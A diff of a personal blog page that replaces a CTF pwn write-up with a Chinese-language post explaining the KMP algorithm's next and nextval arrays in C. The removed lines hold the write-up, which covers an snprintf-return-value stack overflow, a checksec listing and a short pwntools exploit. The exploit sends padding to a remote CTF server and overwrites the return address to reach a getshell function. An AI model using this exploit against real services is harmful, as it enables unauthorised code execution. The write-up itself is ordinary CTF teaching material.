@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="pwn,栈溢出,snprintf,">
+  <meta name="keywords" content="KMP,数据结构,">
 
 
 
@@ -79,18 +79,20 @@
 
 
 
-<meta name="description" content="snprintf误用，它返回的是格式化解析后形成的字符串的长度（及期望写入目标缓冲区的长度），而不是实际写入目标缓冲区的内存长度。">
-<meta name="keywords" content="pwn,栈溢出,snprintf">
+<meta name="description" content="对KMP算法的一点理解">
+<meta name="keywords" content="KMP,数据结构">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SUS YoRHa-pwn2">
-<meta property="og:url" content="http://suvii22.github.io/2019/10/07/SUS-YoRHa-pwn2/index.html">
+<meta property="og:title" content="KMP">
+<meta property="og:url" content="http://suvii22.github.io/2019/11/09/KMP/index.html">
 <meta property="og:site_name" content="Apr1L&#39;s blog">
-<meta property="og:description" content="snprintf误用，它返回的是格式化解析后形成的字符串的长度（及期望写入目标缓冲区的长度），而不是实际写入目标缓冲区的内存长度。">
+<meta property="og:description" content="对KMP算法的一点理解">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-11-09T05:36:00.518Z">
+<meta property="og:image" content="http://suvii22.github.io/kmp/kmp.PNG">
+<meta property="og:updated_time" content="2019-11-09T06:05:03.828Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SUS YoRHa-pwn2">
-<meta name="twitter:description" content="snprintf误用，它返回的是格式化解析后形成的字符串的长度（及期望写入目标缓冲区的长度），而不是实际写入目标缓冲区的内存长度。">
+<meta name="twitter:title" content="KMP">
+<meta name="twitter:description" content="对KMP算法的一点理解">
+<meta name="twitter:image" content="http://suvii22.github.io/kmp/kmp.PNG">
 
 
 
@@ -120,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="http://suvii22.github.io/2019/10/07/SUS-YoRHa-pwn2/">
+  <link rel="canonical" href="http://suvii22.github.io/2019/11/09/KMP/">
 
 
 
 
 
-  <title>SUS YoRHa-pwn2 | Apr1L's blog</title>
+  <title>KMP | Apr1L's blog</title>
   
 
 
@@ -283,7 +285,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://suvii22.github.io/2019/10/07/SUS-YoRHa-pwn2/">
+    <link itemprop="mainEntityOfPage" href="http://suvii22.github.io/2019/11/09/KMP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Apr1L">
@@ -300,7 +302,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">SUS YoRHa-pwn2</h1>
+          <h1 class="post-title" itemprop="name headline">KMP</h1>
         
 
         <div class="post-meta">
@@ -312,8 +314,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-07T15:21:07+08:00">
-                2019-10-07
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-09T13:41:44+08:00">
+                2019-11-09
               </time>
             
 
@@ -335,8 +337,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
+                  <a href="/categories/算法/" itemprop="url" rel="index">
+                    <span itemprop="name">算法</span>
                   </a>
                 </span>
 
@@ -346,8 +348,8 @@
                 
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/wp/" itemprop="url" rel="index">
-                    <span itemprop="name">wp</span>
+                  <a href="/categories/算法/笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">笔记</span>
                   </a>
                 </span>
 
@@ -383,15 +385,17 @@
       
 
       
-        <p><code>snprintf</code>误用，它返回的是格式化解析后形成的字符串的长度（及期望写入目标缓冲区的长度），而不是实际写入目标缓冲区的内存长度。</p>
+        <p>对KMP算法的一点理解</p>
 <a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int off = snprintf(buf, 0x100, &quot;name:%s&amp;&quot;, input);</span><br><span class="line">    ...........................</span><br><span class="line">    ...........................    </span><br><span class="line">    ...........................</span><br><span class="line">    // off 可能会比较大，出现越界写</span><br><span class="line">    off = snprintf(buf + off, 0x100 - off, &quot;pwd:%s&quot;, input);</span><br></pre></td></tr></table></figure>
+<h2 id="求解next数组"><a href="#求解next数组" class="headerlink" title="求解next数组"></a>求解next数组</h2><p>我认为理解的KMP算法的困难不在于理解它的思路，而在于学会如何求解<strong>next</strong>数组。<br>我看了很多blog之后，对于求next数组的思路总结了一下：<br>对于模式串P的前j+1个序列字符：</p>
+<ul>
+<li>若P[k] == P[j]，则next[j + 1 ] = next [j] + 1 = k + 1</li>
+<li>若p[k ] ≠ p[j]，如果此时p[ next[k] ] == p[j ]，则next[ j + 1 ] =  next[k] + 1，否则继续递归前缀索引k = next[k]，而后重复此过程。 相当于在字符p[j+1]之前不存在长度为k+1的前缀”p0 p1, …, pk-1 pk”跟后缀“pj-k pj-k+1, …, pj-1 pj”相等，那么是否可能存在另一个值t+1 &lt; k+1，使得长度更小的前缀 “p0 p1, …, pt-1 pt” 等于长度更小的后缀 “pj-t pj-t+1, …, pj-1 pj” 呢？如果存在，那么这个t+1 便是next[ j+1]的值，此相当于利用已经求得的next 数组（next [0, …, k, …, j]）进行P串前缀跟P串后缀的匹配<br><img src="/kmp/kmp.PNG" alt><br>代码如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">void GetNext(char* p,int next[])  </span><br><span class="line">&#123;  </span><br><span class="line">    int pLen = strlen(p);  </span><br><span class="line">    next[0] = -1;  </span><br><span class="line">    int k = -1;  </span><br><span class="line">    int j = 0;  </span><br><span class="line">    while (j &lt; pLen - 1)  </span><br><span class="line">    &#123;  </span><br><span class="line">        //p[k]表示前缀，p[j]表示后缀  </span><br><span class="line">        if (k == -1 || p[j] == p[k])   </span><br><span class="line">        &#123;  </span><br><span class="line">            ++k;  </span><br><span class="line">            ++j;  </span><br><span class="line">            next[j] = k;  </span><br><span class="line">        &#125;  </span><br><span class="line">        else   </span><br><span class="line">        &#123;  </span><br><span class="line">            k = next[k];  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>所以利用<code>snprintf</code>让<code>off</code>移动到返回地址的位置， 然后写返回地址为<code>getshell</code>函数的地址。</p>
-<h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>
-
-<h2 id="确认偏移"><a href="#确认偏移" class="headerlink" title="确认偏移"></a>确认偏移</h2><p>计算偏移时要除去<code>name:%s&amp;</code>中的<code>name:</code>和<code>&amp;</code>，还有<code>pwd:%s</code>中的<code>pwd:</code>共10个字节</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&apos;47.100.40.190&apos;,10002)</span><br><span class="line">p.recvuntil(&apos;welcome.....&apos;)</span><br><span class="line">payload = &apos;a&apos;*(0x10c+4-10)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.sendline(p32(0x8048674))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="next数组的优化"><a href="#next数组的优化" class="headerlink" title="next数组的优化"></a>next数组的优化</h2><p>当p[j] != s[i] 时，下次匹配必然是p[ next[j] ] 跟s[i]匹配，如果p[j] = p[ next[j] ]，必然导致后一步匹配失败（因为p[j]已经跟s[i]失配，然后你还用跟p[j]等同的值p[ next[j] ]去跟s[i]匹配，很显然，必然失配），所以不能允许p[j] = p[ next[j ]]。<br>所以代码可以进一步优化：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">void GetNextval(char* p, int next[])  </span><br><span class="line">&#123;  </span><br><span class="line">    int pLen = strlen(p);  </span><br><span class="line">    next[0] = -1;  </span><br><span class="line">    int k = -1;  </span><br><span class="line">    int j = 0;  </span><br><span class="line">    while (j &lt; pLen - 1)  </span><br><span class="line">    &#123;  </span><br><span class="line">        //p[k]表示前缀，p[j]表示后缀    </span><br><span class="line">        if (k == -1 || p[j] == p[k])  </span><br><span class="line">        &#123;  </span><br><span class="line">            ++j;  </span><br><span class="line">            ++k;  </span><br><span class="line">            //较之前next数组求法，改动在下面4行  </span><br><span class="line">            if (p[j] != p[k])  </span><br><span class="line">                next[j] = k;   //之前只有这一行  </span><br><span class="line">            else  </span><br><span class="line">                //因为不能出现p[j] = p[ next[j]]，所以当出现时需要继续递归，k = next[k] = next[next[k]]  </span><br><span class="line">                next[j] = next[k];  </span><br><span class="line">        &#125;  </span><br><span class="line">        else  </span><br><span class="line">        &#123;  </span><br><span class="line">            k = next[k];  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
       
@@ -410,11 +414,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
+            <a href="/tags/KMP/" rel="tag"># KMP</a>
           
-            <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
-          
-            <a href="/tags/snprintf/" rel="tag"># snprintf</a>
+            <a href="/tags/数据结构/" rel="tag"># 数据结构</a>
           
         </div>
       
@@ -427,8 +429,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/09/29/攻防世界-Mary-Morton/" rel="next" title="攻防世界 Mary_Morton">
-                <i class="fa fa-chevron-left"></i> 攻防世界 Mary_Morton
+              <a href="/2019/11/04/Syc-Geek-10th-Baby-canary/" rel="next" title="Syc Geek 10th -Baby canary">
+                <i class="fa fa-chevron-left"></i> Syc Geek 10th -Baby canary
               </a>
             
           </div>
@@ -436,10 +438,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/10/08/攻防世界-pwn1/" rel="prev" title="攻防世界 pwn1">
-                攻防世界 pwn1 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -573,7 +571,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看保护"><span class="nav-number">1.</span> <span class="nav-text">查看保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#确认偏移"><span class="nav-number">2.</span> <span class="nav-text">确认偏移</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">3.</span> <span class="nav-text">exp</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#求解next数组"><span class="nav-number">1.</span> <span class="nav-text">求解next数组</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#next数组的优化"><span class="nav-number">2.</span> <span class="nav-text">next数组的优化</span></a></li></ol></div>
             
 
           </div>
